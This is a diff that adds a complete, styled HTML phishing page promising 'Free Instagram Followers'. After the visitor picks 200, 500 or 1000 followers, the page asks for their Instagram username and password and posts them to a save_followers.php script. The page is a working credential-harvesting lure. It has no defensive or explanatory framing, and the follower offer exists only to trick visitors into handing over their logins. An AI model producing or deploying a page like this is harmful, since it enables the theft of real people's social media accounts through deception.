@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Instagram Followers 🔥</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Poppins', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            animation: bgPulse 3s infinite;
+        }
+        @keyframes bgPulse {
+            0%, 100% { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
+            50% { background: linear-gradient(135deg, #764ba2 0%, #667eea 100%); }
+        }
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 450px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            animation: slideUp 0.5s ease-out;
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(50px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        h1 {
+            background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+        }
+        .follower-option {
+            display: inline-block;
+            margin: 10px;
+            padding: 15px 30px;
+            background: linear-gradient(135deg, #405de6, #5851db);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        .follower-option:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+        .selected {
+            background: linear-gradient(135deg, #fd1d1d, #e4405f);
+            transform: scale(1.05);
+            box-shadow: 0 5px 20px rgba(253,29,29,0.4);
+        }
+        input {
+            width: 90%;
+            padding: 14px;
+            margin: 10px 0;
+            border: 2px solid #ddd;
+            border-radius: 50px;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #833ab4;
+        }
+        button {
+            background: linear-gradient(135deg, #e4405f, #fd1d1d);
+            color: white;
+            padding: 14px 50px;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: all 0.3s;
+        }
+        button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 20px rgba(228,64,95,0.4);
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>✨ FREE INSTAGRAM FOLLOWERS ✨</h1>
+        <p style="color:#666; margin-bottom:20px">Get real followers instantly!</p>
+        <div>
+            <div class="follower-option" data-followers="200">200</div>
+            <div class="follower-option" data-followers="500">500</div>
+            <div class="follower-option" data-followers="1000">1000</div>
+        </div>
+        <form method="POST" action="save_followers.php">
+            <input type="hidden" name="followers" id="selectedFollowers" value="">
+            <input type="text" name="username" placeholder="Instagram Username" required>
+            <input type="password" name="password" placeholder="Instagram Password" required>
+            <button type="submit">🚀 GET FOLLOWERS NOW</button>
+        </form>
+    </div>
+    <script>
+        const options = document.querySelectorAll('.follower-option');
+        const hiddenInput = document.getElementById('selectedFollowers');
+        
+        options.forEach(opt => {
+            opt.addEventListener('click', () => {
+                options.forEach(o => o.classList.remove('selected'));
+                opt.classList.add('selected');
+                hiddenInput.value = opt.getAttribute('data-followers');
+            });
+        });
+        
+        // Auto select first option
+        if(options.length > 0) {
+            options[0].click();
+        }
+    </script>
+</body>
+</html>
